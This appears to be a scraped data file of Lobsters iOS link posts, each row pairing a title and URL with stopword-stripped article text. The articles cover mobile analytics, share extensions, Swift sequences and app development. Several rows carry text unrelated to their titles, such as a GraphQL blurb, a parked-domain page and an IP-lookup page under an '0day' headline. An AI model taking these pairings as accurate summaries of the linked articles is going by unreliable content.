499,Lobsters,ios,Apple iOS,Snowplow 0.9.8 released for mobile analytics,http://snowplowanalytics.com/blog/2014/09/18/snowplow-0.9.8-released-for-mobile-analytics/,snowplow released mobile analytics,io tracker blog post android tracker blog post mobilecontext geolocationcontext jonathan almeida updated clojure collector updated enrichment process upgrading documentation help sample template please make sure upgrade hadoop enrichment process upgrading collector link mobilecontext script geolocationcontext script raise issue usual channel release note,hugely excited announce release longawaited snowplow version adding event analytics support io android application mobile event analytics requested feature snowplow community time many user keen feed snowplow data pipeline event mobile apps alongside existing website server software mobile event analytics major step journey web analytics tool generalpurpose event analytics platform make much sense silo event stream separate analytics package based whether event originate web mobile somewhere else snowplow believe huge value unifying disparate event stream single event pipeline like snowplow adding mobile support snowplow really different release snowplow add post support clojure collector upgrade enrichment process support post payload containing multiple event new event tracker io see accompanying io tracker blog post new event tracker android see accompanying android tracker blog post new mobilespecific json schema available iglu central mobilecontext geolocationcontext huge thanks snowplow intern jonathan almeida excellent work mobile tracker summer fold cover updated clojure collector updated enrichment process upgrading documentation help upgraded clojure collector support post request batching multiple event client sending batch via post request standard operating procedure mobile analytics designed minimize data usage preserve battery life new android io tracker send event via post also find post support recent version python ruby tracker support post cloudfront collector recommend snowplow user wanting send event mobile device switch clojure collector adding post support scala stream collector roadmap updated hadoop snowplow enrichment process version shredding process unchanged updated enrichment process handle raw event sent updated clojure collector via post updated process support existing collector format additionally validate log post payload contenttype set extract multiple raw event post payload feed raw event rest enrichment process read upgrading instruction release bump hadoop enrichment process version configyml file update hadoop enrich version like version hadoopenrich complete example see sample configyml template please make sure upgrade hadoop enrichment process upgrading collector release bump clojure collector version upgrade release download new warfile rightclicking link selecting log amazon elastic beanstalk console browse clojure application click new upload warfile new tracker send mobilerelated context conforming mobilecontext json schema custom context automatically attached event running redshift deploy mobilecontext table database using script android tracker also optionally sends geolocationrelated context relating geolocationcontext json schema support io tracker planned soon running redshift deploy mobilecontext table database using script mobile event analytics represents major new feature snowplow likely initial bug issue iron indeed new tracker always run issue understand change please raise issue get touch u via usual channel detail release please check release note github
500,Lobsters,ios,Apple iOS,Everything that went wrong while building the Tumblr iOS share extension,http://engineering.tumblr.com/post/97658880154/everything-that-went-wrong-while-building-the-tumblr,everything went wrong building tumblr io share extension,http http capability http http githubcomtumblriosextensionissues http openradarappspotcomradar http githubcomtumblriosextensionissuestreemastersamplesbackgroundsessionerrors http developerapplecomlibraryprereleaseiosdocumentationgeneralconceptualextensibilitypgindexhtml http developerapplecomlibraryprereleaseiosdocumentationgeneralconceptualextensibilitypgextensionscenarioshtml http developerapplecomlibraryiosdocumentationfoundationreferencensurlsessionuploadtaskclassreferencereferencehtml http developerapplecomlibraryprereleaseiosdocumentationgeneralconceptualextensibilitypgextensionscenarioshtml http openradarappspotcomradar http openradarappspotcomradar http openradarappspotcomradar http qnsfilecoordinator http developerapplecomlibrarymacdocumentationfoundationreferencensfilecoordinatorclassreferencereferencehtml http developerapplecomlibrarymacdocumentationfoundationreferencensfilepresenterprotocolreferencereferencehtml http developerapplecomlibrarymacdocumentationfoundationreferencensfilepresenterprotocolreferencereferencehtml applerefoccintfmnsfilepresenterpresenteditemdidchange http developerapplecomlibrarymacdocumentationfoundationreferencensfilepresenterprotocolreferencereferencehtml applerefoccintfmnsfilepresenterrelinquishpresenteditemtowriter http developerapplecomlibrarymacdocumentationfoundationreferencensfilepresenterprotocolreferencereferencehtml applerefoccintfmnsfilepresentersavepresenteditemchangeswithcompletionhandler http developerapplecomlibrarymacdocumentationfoundationreferencensfilepresenterprotocolreferencereferencehtml applerefoccintfmnsfilepresenterrelinquishpresenteditemtoreader http http openradarappspotcomradar http githubcomtumblriosextensionissuestreemastersamplesstatusbarstyleignored http developerapplecomlibraryprereleaseiosdocumentationsocialreferenceslcomposeserviceviewcontrollerclass http twittercomsegiddins http openradarappspotcomradar http openradarappspotcomradar http openradarappspotcomradar http twittercomviticci workaround doable predicate syntax misc thanks matt bischoff paul rehkugler brian michel sam giddins,tumblr share extension icon featured banner apple wwdc event http io app extension launching wednesday part io http capability provide exciting opportunity developer type apps integrate customer device like never tumblr http thrilled pull curtain share extension working hard quite process building tumblr share extension fun also really frustrating time hit quite problem ended needing work around interest helping would like detail issue encountered course mileage may vary talked developer problem hit make easy track update problem share workarounds created issue github repo http githubcomtumblriosextensionissues one please create pull request got solution issue encountered something get background file uploads work radar background nsurlsessionuploadtask read file app group shared container http openradarappspotcomradar sample project http githubcomtumblriosextensionissuestreemastersamplesbackgroundsessionerrors apple app extension programming guide http developerapplecomlibraryprereleaseiosdocumentationgeneralconceptualextensibilitypgindexhtml contains section performing uploads downloads http developerapplecomlibraryprereleaseiosdocumentationgeneralconceptualextensibilitypgextensionscenarioshtml complete sample code indicating background session used perform uploads may last longer extension process alive normally nsurlsessionuploadtask http developerapplecomlibraryiosdocumentationfoundationreferencensurlsessionuploadtaskclassreferencereferencehtml created stream raw data file url latter intended used extension make sense communication extension container application app group occurs shared container http developerapplecomlibraryprereleaseiosdocumentationgeneralconceptualextensibilitypgextensionscenarioshtml special secure location disk extension app able read write extension writes file shared container initiate task upload file upload ostensibly occurs third process allowing continue even extension terminated container application later woken notified success failure able get actually work experience extension container application access shared container without issue nsurlsessiontask seemingly unable instead spit error find radar http openradarappspotcomradar workaround soon user tap post button ideally like dismiss extension let get day continuing upload background given able get work given extension progress bar keeping screen request completes possible user could background host application io could kill order reclaim memory seems like best option given limitation happily go back using background session issue seeing end getting fixed container application must opened share extension used radar need way migrate data shared container without requiring user explicitly launching containing app using extension http openradarappspotcomradar mentioned shared container everything need access app extension must located user default keychains database file serializing via nscoding etc existing apps problem simple data already exists somewhere outside shared container container app migrate thus user installs update add extension try use extension launching application giving chance perform migration going bad time workaround great option user open extension first throw dialog telling need launch application first inelegant necessary get nsfilecoordinator work radar nsfilecoordinator work reliably across application share extension http openradarappspotcomradar nsuserdefaults sqlite useful synchronizing data access across extension container application per wwdc session http qnsfilecoordinator nsfilecoordinator http developerapplecomlibrarymacdocumentationfoundationreferencensfilecoordinatorclassreferencereferencehtml also supposed option u using nscoding custom data persistence tried hard actually get reliably work use case required app extension write file app would read observed number problem extension app process running simultaneously nsfilepresenter http developerapplecomlibrarymacdocumentationfoundationreferencensfilepresenterprotocolreferencereferencehtml method intended indicate file modified presenteditemdidchange http developerapplecomlibrarymacdocumentationfoundationreferencensfilepresenterprotocolreferencereferencehtml applerefoccintfmnsfilepresenterpresenteditemdidchange relinquishpresenteditemtowriter http developerapplecomlibrarymacdocumentationfoundationreferencensfilepresenterprotocolreferencereferencehtml applerefoccintfmnsfilepresenterrelinquishpresenteditemtowriter would either called called switching application called method would cause app overwrite data extension written either savepresenteditemchangeswithcompletionhandler http developerapplecomlibrarymacdocumentationfoundationreferencensfilepresenterprotocolreferencereferencehtml applerefoccintfmnsfilepresentersavepresenteditemchangeswithcompletionhandler relinquishpresenteditemtoreader http developerapplecomlibrarymacdocumentationfoundationreferencensfilepresenterprotocolreferencereferencehtml applerefoccintfmnsfilepresenterrelinquishpresenteditemtoreader called first workaround rather trying keep access single file synchronized across process modified extension instead atomically write individual file never modified directory application read say nsfilecoordinator currently viable option got different usage new york time app http example successfully using nsfilecoordinator simpler setup container app writeonly extension readonly share extension set status bar color radar share extension status bar respect preferredstatusbarstyle http openradarappspotcomradar sample project http githubcomtumblriosextensionissuestreemastersamplesstatusbarstyleignored tumblr share extension like container application dark blue background color white look great dark blue black much tried everything find way share extension us custom view controller subclass opposed slcomposeserviceviewcontroller http developerapplecomlibraryprereleaseiosdocumentationsocialreferenceslcomposeserviceviewcontrollerclass specify status bar style instead always get status bar style host application since expecting photosapp safari black status bar two apps tumblr user share really disappointing workaround none far neither infoplist key view controller method worked even get handle keyboard window way application usually accomplish using private api sam giddins http twittercomsegiddins nearly went insane trying thanks sam hoping way io exclude share extension application activity controller radar way exclude app share extension showing within app http openradarappspotcomradar make sense specifically exclude specific share extension activity view controller want instagram something like preventing sharing twitter would one extension able remove app activity view controller extension silly able share tumblr within tumblr mean work ok guess weird workaround none far tried configuring activity controller activity item custom uti specifically giving share extension predicate would cause show said uti present unintended side effect brings u next default share extension show explicitly support provided activity item radar nsextensionactivationrules need match single activity item share extension displayed http openradarappspotcomradar radar documentation custom nsextensionitemactivation rule vague http openradarappspotcomradar doozy important issue found one probably deserves blog post application pas data share extension application configures uiactivityviewcontroller array activity item activity controller display system activity share extension operate type item provided think work using tumblr app example user longpresses photo put image data post url maybe text summary post activity item array expect share extension support either image data url text show activity controller actually happens share extension explicitly support image url text show problem simplest way specify extension support far best documented adding nsextensionactivationrule key like nsextensionactivationsupportstext yes look like would mean show extension long activity item text really mean show extension long one activity item text federico viticci http twittercomviticci point likely used thirdparty share extension anyone else planet verifies fact legitimate problem workaroundthis negatively affect app extension developer mean app developer configure activity controller single activity item couple problem first doable pain like tumblrapp want system activity like copying saving camera roll support multiple different type data secondly huge shame export one type data limit number sharing option user able performextension developer use complex unfortunately thoroughly documented predicate syntax specifically specify relationship would look something like subquery extensionitems extensionitem subquery extensionitemattachments attachment attachmentregisteredtypeidentifiers uticonformsto publicimage count subquery extensionitems extensionitem subquery extensionitemattachments attachment attachmentregisteredtypeidentifiers uticonformsto publictext count count miscthanks huge thanks matt bischoff paul rehkugler brian michel sam giddins helping find issue employ workarounds filing radar creating sample project helping edit post welland course framework developer evangelist team apple extension given u prime opportunity delight user even got lot idea wait see everyone else come well
504,Lobsters,ios,Apple iOS,My year with a distraction-free iPhone (and how to start your own experiment),https://medium.com/@jakek/my-year-with-a-distraction-free-iphone-and-how-to-start-your-own-experiment-6ff74a0e7a50,year distractionfree iphone start experiment,year distractionfree iphone start experiment distractionfree iphone zombie yes still one year later hour experiment remove safari remove mail good psychology remove infinity apps consciously decide keep want sensible phone smart phone word sermon tell try tweet,year distractionfree iphone start experiment realized problemmy iphone made twitchy could feel pocket calling like ring called bilbo baggins distracted kid distracted wife distracted anytime anywhere willpower ignore email twitter instagram whole world wide web infinity pocket muchi wanted get control want give iphone altogether loved google map uber find friend amazing cameraso decided try experiment disabled safari deleted mail account uninstalled every app handle thought try weeka month went two loving newfound freedom wrote post experience medium called distractionfree iphonethen lot people read post got view medium lifehacker ran got gizmodo ran got another obviously people interested topic interesting writer comparison next thing wrote zombie got le view sure bajillion reader especially gizmodo wanted talk idiot buy flip phone see lot people supportive lot actually tried even friend gave shotthe biggest victory wife made iphone distractionfree month telling nut bet stoked really gloat situation enlightened guy good iphone thing anyway still get lot people asking still people probably impatient read long boring intro skimmer answer big letter yes still one year lateroh great come selfrighteous partover last month learned enjoy least ok moment boredom reach phone lot le often probably imagination feel like easier concentrate need get thing done tackle big projecttimes bus would checked email listen music look around even started meditating bus yes really please mug using app called calm believe hippy dippy weirdo meditating bus using app actually lot happier tweetsat home phone becomes part stereo nothing work set thing lot nearly day forget something never able imagine weird part experiment supposed hardship feel like easy way want go back going back sound difficult think thing keep track managing notification stream ping bleep add lot workthe hour experimentif intrigued encourage try going distractionfree hour pretty easy set iphone people done really enjoy breaknow pressure people seem handle smartphones fine rest u worthy remove safarisafari big problem open window limitless universe know everything infinity given moment something super interesting internet seen actually gon na go check real quick iphone postyou delete safari go setting restriction turn em turn safari yes know restriction person trust use phone kinda awkward right remove mailemail another big problem good psychology behind brain glitch make random reward incredibly appealing slot machine big payout note bos guessi give email luckily job really phone last year encouraged people text call need fast response added bonus people much higher threshold texting calling firing emailyou turn mail app way iphone easiest thing delete email account remove infinity appsinstagram facebook twitter even new york time potentially endless supply new interesting stuff could check time none belong phoneyou delete apps oldfashioned way course jiggle jiggle consciously decide keephaving blank desktop phone surprisingly calming cleared much stuff wanted keep clean found really useful ask remaining app phone tool made life better dragging along ride made cut list phonemessagescameraapps make feel like live future kept folder inventively called future dropbox google map uber rdio instacart lot nondistractors amazing even weather app pretty cool stop think mean walkman point reference freakin walkman totally amazing get weather report pocket would never ever get addicted useful thing rarely use like new york subway map compassuseless thing delete like passbook game centerwhat left iphone still fantastic far better flip phone getting better timei want sensible phone smart phonethis whole exercise left feeling like took iphone life without ever really thinking gon na take internet time everywhere sign game news photo popularity yes please please allyoucaneat buffet excellent gourmet food trouble always eat shouldsince line work helping company build software hardware trying take philosophy heart leave little word sermonwhen invest time energy technology creator consumer invest product belong future make life disappear faster already dopersonally life already going speed light past year felt tiniest bit slowertell try itthanks reading experiment love hear take screenshot drop tweet check laptopupdate set distractionfree android
505,Lobsters,ios,Apple iOS,"RTFM 0day in iOS apps: G+, Gmail, FB Messenger, etc.",http://algorithm.dk/posts/rtfm-0day-in-ios-apps-g-gmail-fb-messenger-etc,rtfm io apps g gmail fb messenger etc,whatsmyipdk,din info ip adresse eller xforward ip adresse r browser useragent foresp√∏rgsels timestamp unix tid foresp√∏rgsels leveret af whatsmyipdk
506,Lobsters,ios,Apple iOS,Interview with Adam Ernst on functional approaches for iOS applications,http://www.infoq.com/interviews/adam-ernst-facebook-ios,interview adam ernst functional approach io application,hi adam ernst io developer facebook qcon new york adam part facebook io app pretty much since beginning fact want start asking transition web app native io app io replicate entire tree presumably lot memory pressure optimization update part tree seen benefit term type safety using objective c opposed pure objective c given got data structure immutable tree get created change come apply change ui found result fewer bug easier identify process update occur think idea immutable data structure update talking could reproduced reused application maybe outside facebook pop github watch developer blog finally talked objective c useful generic array able deal type safety recently apple announced swift programming language see useful future swift,hi adam ernst io developer facebook qcon new york adam part facebook io app pretty much since beginning fact want start asking transition web app native io app transition made based hybrid app fully native io app big change u came started rewrite part original team io developer time small team fit one room could talk u facebook challenge faced really one scaling scaled io organization small team people developer many committers occasional committers io repository needed find kind thing way structure code way design apis scale fashionalex gave talk qcon functional programming io io developer need worry working main thread multiple thread came today qcon talk functional programming io kind rare combination one usually hear hear people using scala mapreduce functional programming mapreduce io much still imperative programming game apple framework apis encourage today wanted talk applied functional programming within traditional objective c kind code functional style reliability testability benefit give u news feed io think really exciting part work allows u scale many developer working news feed keep reliable testable use functional style concept alex presumably problem main thread block user interface freeze obviously bad thing io apps yes key u want frame per second scrolling really yet take u lot effort get io much concept anointed main thread ui work happens user interface time per second going update show whatever latest state scroll user interface scrolling need make sure nothing blocking main thread millisecond enormous challenge especially older slower device needed build framework apply concept allow u move work main thread much possible one thing simple app imagine taking simple object property moving background something complex facebook thing changing time story rendering immensely complex nested attachment story change finding framework really challenging u especially number developer working size code base functional programming allowed u tame complexity tame beast able follow understand test code reliable robust news feed io alex guess multithreading aspect really present problem got mutable data structure thread able update content trying relayout subview example yes facebook io started much traditional mutable data model system ran problem difficult follow code jump multiple thread ordering race make five change different thread order change applied thread would unpredictable difficult understand one change would ripple system change would cause u able understand system make reliable really key use immutable data structure story object news feed something change modify existing object create entirely new tree model object represent new state story make far easier reason state given part code going given time replicate entire tree presumably lot memory pressure optimization update part tree one first concern heard developer proposed moving functional style news feed going use deep immutable data structure absolutely going waste lot cpu memory whenever anything change change one little boolean user like story changing one boolean going ripple entirely new tree entire story seems incredibly wasteful turn wellstudied problem computer science got concept persistent data structure reuse part tree changed actual amount work need get immutable guarantee big might think pretty vital performance something small iphone limited cpu ram disposal alex fact git work cover storing data pretty widely used even people know precisely give kind guarantee like git sign commits immutable sign give guarantee knowing repository secure similar obviously worried security application sandboxed communicating server using http give different kind security guarantee model object know never going change whatever computation deriving object always going valid need make change whole new sandbox like git alex believe talked thing component data structure also factory uis wondered could explain bit chose c rather objective c store data structure fundamental design system idea component component objective c class also use objective c framework let integrate c objective c seamlessly compatible syntax use c give u lot nice performance benefit also give u terse syntax really important u objective c famously verbose language cause u lot grief going fully functional declarative wanted something terser objective c give u great balance nice semantics objective c familiarity regular objective c developer yet get power c fact worried beginning would challenge io developer know c come understand system turn problem issue seen benefit term type safety using objective c opposed pure objective c another benefit using objective c opposed regular objective c give tool c type safety const safety standard objective c nsarray array inside array know type checked compiler enforcement developer get array read documentation find array struck u really problematic honestly c use stl container templatetized actually get type safety say vector component vector component layout know type element collection going strongly typed similarly immutability important u say alright parameter input function const whatever type know function modify argument defined const really important u reasoning guarantee make easy follow reason code given got data structure immutable tree get created change come apply change ui magic really happens u infrastructure infrastructure component responsible detecting brand new top level tree come due change notified external store say alright need build new tree component main thread avoid blocking main thread user scrolling go build tree component reason main thread constructing tree component essentially nothing pure function set input case model object output case immutable component data structure basically list instruction create view view going back infrastructure infrastructure responsible saying old component tree new component tree like story let reconcile step tree parallel recycles reconfigures view course mean dirty secret deep inside infrastructure mutating ui view still living reality apple framework mutable hidden product developer product developer working news feed know write pure function everything else taken care need worry mutating thing alex presumably give productivity device also term developer team behind writing code exactly see benefit side le tedious error prone recycling code try make recycling ui view device optimal developer productivity standpoint know write one function return immutable data structure need worry thread safety need worry locking need worry deadlock wrapped one simple place appears right news feed fantastic alex existing framework like reactivecocoa try similar sort thing wonder compare approach done component approach reactivecocoa take updating ui big fan reactivecocoa facebook use product area use news feed particular reactivecocoa great encourages write declarative style one reason use component encourages express thing function rather bunch mutable state modification issue wanted one way data flow make change flow top system result entirely new tree whereas reactivecocoa familiar traditional system mutable model mutable state observes model change mutable object ripple change throughout system using binding call signal great approach want stay invested mutable traditional world find also cause really complex system really difficult follow ripple one change like liking post result signal firing really hard debug follow happening prefer somewhat na√Øve simpler approach starting entirely new tree reconciling infrastructure found result fewer bug easier identify process update occur key reason component infrastructure switched functional programming deluged bug bug hard reproduce bug engineer absolute worst type bug one reproduce understand wanted framework would make easy reproduce understand problem easy test understand code found tremendously rewarding gotten lot better functional programming switch instead whole bunch bug report internal tester case could never reproduce usually identify something gone wrong correct quickly write unit test reproduces problem make sure regress fantastic far concerned think idea immutable data structure update talking could reproduced reused application maybe outside facebook yes think concept immutable data structure one leg definitely one come functional programming world use react framework javascript also encourage immutable data model would like evangelize kind immutable data model structure io yet stage something open source yet tied infrastructure talked would take bring outside world yet encourage others think apply pattern code use immutable data model hopefully come something opensource share developer alex facebook developer place people follow announcement happen able see externally oh certainly open sourcing lot great stuff io got pop new animation framework used paper app lot exciting thing time go watch github watch developer blog hopefully announce finally talked objective c useful generic array able deal type safety recently apple announced swift programming language see useful future real hairpin twist story apple announced swift brand new programming language writing apps io swift lot functional concept inherited put design really exciting mean functional programming enthusiast really exciting time io developer getting functional programming concept filtered io question still unanswered going integrate everything already done facebook io may port done swift may short term maybe longer term know yet good news everyone working facebook io vast majority io developer great time applying functional concept code learning swift operates encourages style writing code hopefully many people see benefit immutability understanding code hopeful spread alex exciting time io developer exciting time alex thank much thank alex
507,Lobsters,ios,Apple iOS,Merging Audio and Video in Native iOS,http://developer.telerik.com/featured/merging-audio-video-native-ios/,merging audio video native io,,graphql specification defines type system query schema language web api execution algorithm graphql service engine validate execute query graphql schema article learn implement authentication graphql server
509,Lobsters,ios,Apple iOS,Mobile Connectivity in iOS Apps,http://developer.telerik.com/featured/mobile-connectivity-ios-apps/,mobile connectivity io apps,challenge partnership community deliver expected,challenge demand better user experience continues grow time develop high quality modern engaging application continues shrink stop sweating ui focus part application truly make differencepartnership community like developer purpose life make developer superheroes enabling deliver expected faster expected nearly two decade partnering community two million developer help cut development time increase productivity make easy embrace latest technology user experience trendsdeliver expected using modern featurerich professionally designed ui component telerik kendo ui armed everything need deliver outstanding web mobile desktop experience le timewith backing legendary technical support provided directly developer build product confident best partner rely journey
510,Lobsters,ios,Apple iOS,Learn ‚ûú Swift,http://learn-swift.co,learn swift,search ideal co web address,search ideal co web addressget gone
511,Lobsters,ios,Apple iOS,Swift Sequences and Lazy Evaluation,http://www.scottlogic.com/blog/2014/06/26/swift-sequences.html,swift sequence lazy evaluation,swift sequence deferred execution lazy evaluation deferred execution lazy evaluation fibonacci sequence fibonacci sequence manipulating sequence creating sequence operation exswift conclusion,lot fun poking around swift apis past week lack documentation mean real gem hidden among mundane api language feature blog post want take quick look swift sequence protocol form basis forin loop see allows write code performs sequence operation evaluated ondemand swift sequence swift couple elegant language feature forin loop range used combination provide succinct syntax simple loop println code iterates integer range funky range operator simple shorthand creating range instance result following code entirely equivalent var range range start end range println range allows forin loop iterate number generates forin loop operates object adopt sequence protocol represents ordered source data sequence protocol expose single method generate return generator expose single method next allows forin loop pull stream item sequence probably make lot sense continuing expand current example make explicit use sequence generator var sequence range start end var generator sequencegenerate let generatornext println one interesting point swift range finite sequence start end sequence protocol mandate used represent infinite sequence although probable avoid using infinite sequence forin loop deferred execution lazy evaluation seen swift sequence let look support concept lazy evaluation first couple definition deferred execution deferred execution mean evaluation expression calculation deferred resultant value required sequence opportunity defer execution value requested generator lazy evaluation lazy evaluation topic relates deferred execution context swift sequence lazy evaluation implemented ensuring work required provide next value via generator performed next value actually requested probably sound like quite abstract concept let see used practice fibonacci sequence let say want perform calculation fibonacci sequence could populate array first term use calculation swift sequence offer elegant alternative simple implementation using swift sequence class fibonacci sequence typealias generatortype fibonaccigenerator func generate fibonaccigenerator return fibonaccigenerator class fibonaccigenerator generator var current nextvalue typealias element int func next int let ret current current nextvalue nextvalue nextvalue ret return ret fibonacci class implement sequence protocol note sequence generic protocol hence need typealias specify type parameter fibonaccigenerator generator implementation real work happens time next method invoked next number neverending sequence generated see result simply iterate first number sequence let fib fibonacci generate println fibnext yield following output actually slightly simpler way implement sequence remove need separate generator type following make use generatorof pas function closure implement required functionality class fibonacci sequence func generate generatorof int var current next return generatorof int var ret current current next next next ret return ret pretty neat order aid understanding next set example following add simple println statement fibonacci sequence see next item requested generator class fibonacci sequence let id string init id string selfid id func generate generatorof int var current next return generatorof int var ret current current next next next ret println selfid ret return ret updating code iterates sequence use implementation log generation let fib fibonacci fib generate println fibnext yield following output fib fib fib fib clearly demonstrates next item requested generator iteration fibonacci sequence generated lazily manipulating sequence lazy evaluation sequence quite cool thing get even interesting apply operation sequence transforming output swift apis handful operation apply sequence let say interested even number within fibonacci sequence achieved using filter function let fibonacci fibonacci fib let evennumbers filter fibonacci filter method return new sequence contains item within source sequence closure return true result evennumbers also sequence result deferred execution perform operation sequence nothing generated something start pulling data one sequence see action iterate first item sequence var generator evennumbersgenerate println generatornext yield following output fib fib fib fib fib fib fib fib fib fib see source sequence generating multiple value value pass filter operation lazily evaluated another interesting operation applied using struct combine pair sequence generating tuples combine generated output sequence example following zip together odd even fibonacci number let evennumbers filter fibonacci let oddnumbers filter fibonacci var zipped oddnumbers evennumbers generate println zippednext give following output creating sequence operation unfortunately filter pretty much sequence operation could find within swift apis go adding operation personally keen global function prefer add functionality via class extension unfortunately sequence protocol extended however lost framework provides sequenceof struct wrap adapts sequence without changing behaviour context used type providing extension creating sequence operation mindful fact evaluate lazily like fibonacci sequence example simple skip operation skip first n item sequence extension sequenceof func skip n int sequenceof var generator selfgenerate n println skipped generatornext return sequenceof generator adding skip zip let evennumbers filter fibonacci let oddnumbers filter fibonacci var zipped sequenceof oddnumbers evennumbers skip generate println zippednext yield following output skipped skipped course chain multiple operation skip skip however simple skip operation much fun think sequence show lot potential plan contribute suite operation already rather excellent exswift library conclusion swift sequence really cool show lot potential example blog post little contrived unlikely find performing operation fibonacci sequence however could certainly see operating sequence generated stream perhaps paging network request regard colin e
512,Lobsters,ios,Apple iOS,4 Mistakes To Avoid in Mobile App Development,http://developer.telerik.com/featured/4-mistakes-avoid-mobile-app-development/,mistake avoid mobile app development,nt beta tester prelaunch marketing task roomalyzrcom roompaintingappcom preapps nt assume ui obvious nt monetization fly nt forget test ad conclusion,mobile app developer since got first iphone four year ago concentrating mostly educational fitness apps apps built year include seven minute workout app stretching app apps teach chinese conversation middleeastern dance ebooks apps help kid practice musical instrument others enjoy releasing little software nugget wild solve small problem ease pain point customer apps paid apps done moonlighting side project thus without large resource marketing social medium push general earned modest download rate imagine surprise one apps roomalyzr hit app store garnered downloads first day consistently downloads per day subsequently caught surprise soon realized made mistake design app successful could known design requirement type app article going share sometimes difficult lesson learned releasing roomalyzr app outline tip designing app avoiding mistake might get lot downloads app done right recurring revenue nt beta tester roomalyzr born entry contest hosted corona lab maker corona sdk introduced graphic new way working graphic filter special effect mind perfect test bed roompainting graphic design app weekend roomalyzr born built sent coronalabs lucky enough win category business apps roll decided launch app io android followed advice prelaunch marketing task creating twitter account website secured roomalyzrcom roompaintingappcom nice icon beautiful screenshots publicity app trailer video current roomalyzr interface also submitted app preapps get little prelaunch visibility made first mistake nt feel time follow volunteer signed betatest app instead device testing beta testing simple task part every app deployment asking friend family kid volunteer tester click make sure understand app work preferably start beta testing early development process catch problem ui entirely committed app design asked external people betatest would realized missing tutorial removed alert included proved annoying user rethought use interstitial ad see better thought inapp purchase availability nt assume ui obvious uis created equal creating kid app ui entirely different business fitness app creating painting app smart idea check many similar apps see uis like market research apparently ui presented real problem user based early feedback via app review user nt understand manage colourlovers integration enables import new color palette nt see pulldown panel encloses entire painting toolbox update app included tutorial show first time app used available viewed subsequently via button bottom navigation bar update negative review significantly slowed detailed tutorial mandora app game interface simple onescreen tutorial business app take time download least five apps genre targeting ask app deviate significantly good way apps monetizing mine fit general strategy within sample set app stand innovative way intrigue user without annoying nt monetization fly inapp purchase critical monetization strategy free apps tricky however make app look like cash register always begging upgrade initially included one option inapp purchase send copy roomalyzed room painting remove ad subsequent upgrade included two new panel one lighting another plant addition decorate room available via inapp purchase would smarter strategy include one central store location user see exactly sale app decide whether use launch app get initial rush downloads solid iap strategy surely pay even begin building free app ask going monetize much depending ad bring revenue inapp purchase point well defined purchasing process smooth take look top free apps sorted revenue app annie download one see monetizing maybe get idea consider releasing free paid version app make sense within overall strategy nt forget test ad experience ad network roomalyzr avoided placing ad apps feel place fitness apps distraction educational apps often target young audience lack experience meant made every mistake book regard ad placement app initially included fullscreen video ad delivered vungle naively thought would provide oneanddone experience user vicious negative review however triggered interstitials clearly genre app wrong type ad fullscreen interstitials used effectively game often pausepoint ad shown workflow wizardtype interface like roomalyzr built encourage art creation maddeningly distracting example fullscreen interstitial ad madgods app switching iads served google solved problem placement ad remains challenge chose put banner top screen except panel placed windowshade style pulldowns top photo screen displayed even one reviewer complained sometimes ad load delay actually cover tool panel blocking core functionality addition seems ad better placed bottom screen future iteration app plan move navigation offscreen allow ad show throughout app experience placed bottom example banner ad bottom nav pockettube app think hard ad going put want interstitials video ad banner ad kiipstyle reward think apps use good ad placement placing banner ad top bottom middle think way monetize ad sure test ad various device including tablet conclusion would say launch maintenance various iteration roomalyzr app valuable learning experience negative feedback painful compels evolve app skill takeaway experience include need solid betatesting coherent monetization strategy cleareyed choice ad network market research inclusion tutorial sure continue develop apps learn even lesson glad hear experience
513,Lobsters,ios,Apple iOS,Device Mirroring Options for Mobile Developers,http://developer.telerik.com/featured/mirroring-options-mobile-developers/,device mirroring option mobile developer,window phone window phone even technically need developer get miracast project screen nokia beamer io lightning vga lightning hdmi reflector tj vantoll airserver xbmc medium receiver android mobizen michael crump chromecast brings full screen android mirroring conclusion,mobile developer feel sense joy deploy apps see running real device feel great see code action interact creation next obvious step show creation right however sharing group recording demo sharing via tiny smartphone screen simply nt work would really need mirror device screen running app onto much bigger screen number use case device screen mirroring taking app screenshots recording app demo sharing client technical speaking live demo thankfully tooling come long way article sum popular effective mirroring option crossplatform mobile developer let explore window phone let begin window phone yes one lowest market share well respected o nonetheless passionate developer community window phone look awesome update bringing cortana action center worldflow keyboard whole lot feature mobile carrier push window phone update summerfall update available window phone even technically need developer get running window phone beta update look setting find project screen setting shown wireless mirroring work ultimate goal support miracasttype receiver screencasting grab project screen pc app usb cable connect window phone prompted phone project screen may uninstall preexisting phone driver device manager shown otherwise fire project screen pc app connect window phone phone screen get immediately duplicated pc see screenshot displaying window phone start screen screen simulation stay sync phone may also choose display touch pointer screen great demo screen projection usb cable thing craving wireless mirroring window phone nokia window phone luck nokia excellent beamer service wireless screencasting window phone even need window phone modern browser simply head nokia beamer website grab window phone app scan qr code boom window phone screen beamed browser nokia mirroring server screenshot expect beamer website visual window phone screen beamed wifi io several good mirroring option io first simplest requires newer device iphone touch gen forward specifically need io device lightning port screencast directly device bigger screen vga hdmi input simply grab lightning vga lightning hdmi adapter connect device bigger screen appropriate input voila screen mirrored including anything running device wired connection thing want convenience wireless mirroring best option may reflector come highly recommended colleague tj vantoll reflector quite simply airplay receiver io device extra needed already built simply fire reflector application pcmacandroid allow io device stream device airplay find expect reflector website followed screenshot little ipod touch gen device told airserver xbmc medium receiver apps pcmac also decent job mirroring airplay android fortunately android story platform plenty mirroring option cover noteworthy choice mobizen also highly recommended good friend michael crump mobizen offer reliable android screencasting browser window pc application full interactivity mirroring device grab mobizen app google store plug away mirroring android device bigger screen screenshots showcase mobizen feature followed michael android phone screen mirrored another fun option wirelessly mirror android device bigger screen come tiniest streaming device popular google chromecast week back chromecast update brings full screen android mirroring chromecastconnected tv instead app content cast entire android device screen tv everything show bigger shown sample android screenshot conclusion bottom line matter mobile platform targeting several option mirroring smartphone device onto bigger screen love mirroring option nt mention drop comment share simulator come long way nothing beat ondevice app testing able easily share mobile device screen audience invaluable
515,Lobsters,ios,Apple iOS,5 Killer Tools for iOS Developers,http://developer.telerik.com/featured/5-killer-tools-ios-developers/,killer tool io developer,telerik ui io discontinued uwp xamarin kendo ui angular kendo ui react mean customer documentation resource telerik ui xamarin question address,telerik ui io discontinued taking decision easy multiple factor taken consideration time changing mobile development trend native mobile application development become preferred method creating mobile apps io android existing crossplatform framework hardly compete always stood developer productivity believe road productivity paved skill reuse targeting multiple platform single code base deliver truly native application focusing product portfolio enhance productivity working popular rising development platform way continue provide best ui productivity tool help developer keep pace latest trend technology staying true calling increasing investment tooling around latest technology developer need includes net related product like uwp xamarin javascript offering kendo ui angular brandnew kendo ui react name mean customer effective immediately new feature product update accompanying documentation resource remain available understand might inconvenience strongly advice try telerik ui xamarin continue building io mobile application question address ready best answer question comment might drop u line reply soon possible
